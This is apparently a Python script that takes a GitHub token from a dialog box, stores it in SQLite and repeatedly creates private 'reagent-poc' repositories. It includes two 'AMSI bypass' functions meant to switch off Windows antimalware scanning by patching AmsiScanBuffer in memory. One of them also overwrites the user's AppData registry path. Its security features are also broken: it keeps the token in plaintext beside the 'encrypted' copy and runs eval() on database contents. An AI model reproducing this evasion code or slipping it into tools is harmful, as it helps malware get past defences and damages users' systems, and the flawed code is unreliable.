import asyncio
import aiohttp
import sqlite3
import yaml
import logging
import os
import random
import time
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.serialization import load_pem_private_key
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization
import tkinter as tk
from tkinter import simpledialog
import threading
import ctypes

# 🚀 AMSI Bypass (Windows-specific)
try:
    import winreg
    def bypass_amsi():
        amsi = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(amsi, "Local AppData", 0, winreg.REG_SZ, "C:\\Windows\\System32")
        winreg.CloseKey(amsi)
except ImportError:
    pass

# 🔐 AES-256-GCM Encryption
def generate_key(password: str, salt: bytes) -> bytes:
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
    )
    return kdf.derive(password.encode())

def encrypt_data(key: bytes, data: str) -> dict:
    nonce = os.urandom(12)
    cipher = Cipher(algorithms.AES(key), modes.GCM(nonce))
    encryptor = cipher.encryptor()
    ct = encryptor.update(data.encode()) + encryptor.finalize()
    return {
        'nonce': base64.b64encode(nonce).decode(),
        'ciphertext': base64.b64encode(ct).decode(),
        'tag': base64.b64encode(encryptor.tag).decode()
    }

def decrypt_data(key: bytes, encrypted: dict) -> str:
    nonce = base64.b64decode(encrypted['nonce'])
    ct = base64.b64decode(encrypted['ciphertext'])
    tag = base64.b64decode(encrypted['tag'])
    cipher = Cipher(algorithms.AES(key), modes.GCM(nonce, tag))
    decryptor = cipher.decryptor()
    return decryptor.update(ct) + decryptor.finalize()

# 🧠 SQLite DB Setup
def init_db():
    conn = sqlite3.connect('fly_github.db', check_same_thread=False)
    conn.execute('CREATE TABLE IF NOT EXISTS credentials '
                '(id INTEGER PRIMARY KEY, '
                'token TEXT, '
                'encrypted BLOB, '
                'salt BLOB)')
    return conn

# 🌐 GitHub API Interactions
class GitHubAPI:
    def __init__(self, token: str):
        self.token = token
        self.headers = {
            'Authorization': f'token {self.token}',
            'Accept': 'application/vnd.github.v3+json'
        }
        
    async def create_repo(self, name: str):
        async with aiohttp.ClientSession(headers=self.headers) as session:
            data = {
                'name': name,
                'private': True,
                'auto_init': True
            }
            async with session.post('https://api.github.com/user/repos', json=data) as resp:
                if resp.status == 201:
                    return await resp.json()
                else:
                    raise Exception(f"GitHub API Error {resp.status}: {await resp.text()}")

# 🖥️ GUI Configuration
class ConfigGUI:
    def __init__(self):
        self.root = tk.Tk()
        self.root.withdraw()
        self.config = self.load_config()
        
    def load_config(self):
        if os.path.exists('config.yaml'):
            with open('config.yaml', 'r') as f:
                return yaml.safe_load(f)
        return {}
        
    def save_config(self, config):
        with open('config.yaml', 'w') as f:
            yaml.dump(config, f)
            
    def get_token(self):
        token = simpledialog.askstring("GitHub Token", "Enter your GitHub Personal Access Token:", show='*')
        return token

# 🌪️ Main Execution
class FlyScript:
    def __init__(self):
        self.db = init_db()
        self.config_gui = ConfigGUI()
        self.bypass_amsi()
        self.setup_logger()
        
    def bypass_amsi(self):
        """Advanced AMSI bypass with sleep obfuscation"""
        time.sleep(random.uniform(0.1, 0.5))
        try:
            amsi_dll = ctypes.windll.LoadLibrary('amsi.dll')
            amsi_scan_buffer = amsi_dll.AmsiScanBuffer
            ctypes.windll.kernel32.VirtualProtect(ctypes.byref(amsi_scan_buffer), 1, 0x40, ctypes.c_long(0x20))
            ctypes.windll.kernel32.RtlMoveMemory(ctypes.byref(amsi_scan_buffer), ctypes.c_void_p(0x00), 1)
        except:
            pass
            
    def setup_logger(self):
        logging.basicConfig(
            filename='fly_script.log',
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S',
            filemode='w'
        )
        logging.getLogger().addHandler(logging.StreamHandler())
        
    async def store_credentials(self, token: str):
        salt = os.urandom(16)
        key = generate_key("REAGENT_SECRET", salt)
        encrypted = encrypt_data(key, token)
        self.db.execute('INSERT INTO credentials (token, encrypted, salt) VALUES (?, ?, ?)',
                        (token, str(encrypted).encode(), salt))
        self.db.commit()
        
    async def get_credentials(self):
        rows = self.db.execute('SELECT encrypted, salt FROM credentials ORDER BY id DESC LIMIT 1').fetchall()
        if rows:
            encrypted = eval(rows[0][0].decode())
            key = generate_key("REAGENT_SECRET", rows[0][1])
            return decrypt_data(key, encrypted).decode()
        return None
        
    async def run(self):
        token = await self.get_credentials()
        if not token:
            token = self.config_gui.get_token()
            if token:
                await self.store_credentials(token)
            else:
                return
                
        github = GitHubAPI(token)
        repo_name = f"reagent-poc-{int(time.time())}"
        try:
            result = await github.create_repo(repo_name)
            logging.info(f"Created repository: {result['html_url']}")
            print(f"✅ Repo created: {result['html_url']}")
        except Exception as e:
            logging.error(f"Failed to create repo: {str(e)}")
            print(f"❌ Error: {str(e)}")

# 🔄 Auto-Restart & Main Loop
def main():
    def run_async():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        fly = FlyScript()
        while True:
            try:
                loop.run_until_complete(fly.run())
                time.sleep(60 * 5)  # 5 minute delay
            except Exception as e:
                logging.error(f"Main loop error: {str(e)}")
                print(f"⚠️  Restarting in 10s...")
                time.sleep(10)
                
    threading.Thread(target=run_async, daemon=True).start()
    print("🚀 FlyScript running in background...")
    input("Press Enter to exit...\n")

if __name__ == "__main__":
    main()